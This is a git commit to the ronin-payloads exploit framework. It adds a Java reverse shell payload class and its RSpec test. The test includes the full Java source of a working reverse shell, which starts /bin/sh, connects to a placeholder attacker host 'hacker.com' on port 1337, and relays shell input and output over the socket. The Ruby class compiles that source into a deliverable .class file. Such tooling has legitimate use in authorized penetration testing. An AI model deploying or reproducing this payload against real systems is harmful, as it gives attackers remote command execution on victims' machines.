c692df7c4ec18899c66d818256f42872fa5d1246
Postmodern <postmodern.mod3@gmail.com>
2022-12-09 19:16:38 -0800

    Added a Java reverse shell payload (closes #44).

---
+++ lib/ronin/payloads/builtin/java/reverse_shell.rb
@@ -0,0 +1,71 @@
+# frozen_string_literal: true
+#
+# ronin-payloads - A Ruby micro-framework for writing and running exploit
+# payloads.
+#
+# Copyright (c) 2007-2022 Hal Brodigan (postmodern.mod3 at gmail.com)
+#
+# ronin-payloads is free software: you can redistribute it and/or modify
+# it under the terms of the GNU Lesser General Public License as published
+# by the Free Software Foundation, either version 3 of the License, or
+# (at your option) any later version.
+#
+# ronin-payloads is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU Lesser General Public License for more details.
+#
+# You should have received a copy of the GNU Lesser General Public License
+# along with ronin-payloads.  If not, see <https://www.gnu.org/licenses/>.
+#
+
+require 'ronin/payloads/java_payload'
+require 'ronin/payloads/mixins/reverse_shell'
+require 'ronin/payloads/mixins/build_dir'
+require 'ronin/payloads/mixins/erb'
+
+require 'tmpdir'
+
+module Ronin
+  module Payloads
+    module Java
+      #
+      # A basic Java reverse shell.
+      #
+      class ReverseShell < JavaPayload
+
+        include Mixins::ReverseShell
+        include Mixins::BuildDir
+        include Mixins::ERB
+
+        register 'java/reverse_shell'
+
+        TEMPLATE = File.join(__dir__,'reverse_shell','Payload.java.erb')
+
+        # The path to the generated `.java` file.
+        #
+        # @return [String, nil]
+        attr_reader :java_file
+
+        # The path to the generated `.class` file.
+        #
+        # @return [String, nil]
+        attr_reader :class_file
+
+        #
+        # Builds the Java reverse shell payload.
+        #
+        def build
+          @java_file  = File.join(build_dir,'Payload.java')
+          @class_file = File.join(build_dir,'Payload.class')
+
+          File.write(@java_file,erb(TEMPLATE))
+          compile(@java_file, dest_dir: build_dir)
+
+          @payload = File.binread(@class_file)
+        end
+
+      end
+    end
+  end
+end
---
+++ spec/builtin/java/reverse_shell_spec.rb
@@ -0,0 +1,103 @@
+require 'spec_helper'
+require 'ronin/payloads/builtin/java/reverse_shell'
+
+describe Ronin::Payloads::Java::ReverseShell do
+  it "must inherit from Ronin::Payloads::JavaPayload" do
+    expect(described_class).to be < Ronin::Payloads::JavaPayload
+  end
+
+  describe ".id" do
+    subject { described_class }
+
+    it "must equal 'java/reverse_shell'" do
+      expect(subject.id).to eq('java/reverse_shell')
+    end
+  end
+
+  let(:host) { 'hacker.com' }
+  let(:port) { 1337 }
+
+  subject do
+    described_class.new(
+      params: {
+        host: host,
+        port: port
+      }
+    )
+  end
+
+  describe "#build" do
+    before { subject.perform_build }
+
+    it "must generate generate a new .java file containing the host and port" do
+      expect(File.read(subject.java_file)).to eq(
+        <<~JAVA
+        import java.io.IOException;
+        import java.io.InputStream;
+        import java.io.OutputStream;
+        import java.net.Socket;
+
+        public class Payload
+        {
+        	public static void main(String argv[]) throws Exception
+        	{
+        		String host = "#{host}";
+        		int port = #{port};
+        		String shell = "/bin/sh";
+
+        		Process process = new ProcessBuilder(shell).redirectErrorStream(true).start();
+        		Socket socket = new Socket(host,port);
+
+        		InputStream process_input =process.getInputStream();
+        		InputStream process_error = process.getErrorStream();
+        		InputStream socket_input = socket.getInputStream();
+        		OutputStream process_output = process.getOutputStream();
+        		OutputStream socket_output = socket.getOutputStream();
+
+        		while (!socket.isClosed())
+        		{
+        			while (process_input.available()>0)
+        			{
+        				socket_output.write(process_input.read());
+        			}
+
+        			while (process_error.available()>0)
+        			{
+        				socket_output.write(process_error.read());
+        			}
+
+        			while (socket_input.available()>0)
+        			{
+        				process_output.write(socket_input.read());
+        			}
+
+        			socket_output.flush();
+        			process_output.flush();
+        			Thread.sleep(50);
+
+        			try
+        			{
+        				process.exitValue();
+        				break;
+        			}
+        			catch (Exception e) {}
+        		};
+
+        		process.destroy();
+        		socket.close();
+        	}
+        }
+        JAVA
+      )
+    end
+
+    it "must compile a new Java .class file" do
+      expect(File.file?(subject.class_file)).to be(true)
+      expect(File.empty?(subject.class_file)).to be(false)
+    end
+
+    it "must set #payload" do
+      expect(subject.payload).to eq(File.binread(subject.class_file))
+    end
+  end
+end
